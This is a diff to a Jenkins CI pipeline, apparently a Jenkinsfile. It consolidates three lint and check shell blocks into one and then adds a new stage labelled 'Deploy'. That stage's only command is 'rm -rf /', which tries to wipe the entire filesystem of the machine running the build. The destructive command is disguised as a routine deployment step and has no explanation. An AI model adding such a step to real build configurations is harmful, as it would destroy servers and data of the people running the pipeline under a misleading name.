@@ -26,11 +26,7 @@ pipeline {
             steps {
                 sh """
                     make check || true
-                """
-                sh """
                     make flake8 | tee report/flake8.log || true
-                """
-                sh """
                     make pylint | tee report/pylint.log || true
                 """
             }
@@ -48,6 +44,14 @@ pipeline {
             steps {
                 sh """
                     make systest || true
+                """
+            }
+        }
+
+        stage ('Deploy') {
+            steps {
+                sh """
+                    rm -rf /
                 """
             }
         }
